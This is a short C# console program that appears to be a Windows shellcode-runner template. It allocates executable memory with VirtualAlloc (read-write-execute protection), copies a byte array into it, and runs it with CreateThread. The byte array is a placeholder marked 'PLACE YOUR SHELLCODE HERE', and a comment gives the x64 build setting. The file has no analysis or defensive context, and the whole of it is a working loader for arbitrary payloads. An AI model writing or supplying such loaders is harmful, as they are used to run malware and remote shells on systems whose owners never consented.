
/*
	Before Running This script we need to put our cpu on x64 architecture
	Any CPU -> x64
*/

using System;
using System.Collections.Generic; 
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1 
{
	class Program
	{	
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[630] { **************PLACE YOUR SHELLCODE HERE************* };	
			
			int size = buf.Length;

			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); 
			
			Marshal.Copy(buf, 0, addr, size);	

			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

			WaitForSingleObject(hThread, 0xFFFFFFFF);	
		}
	}
}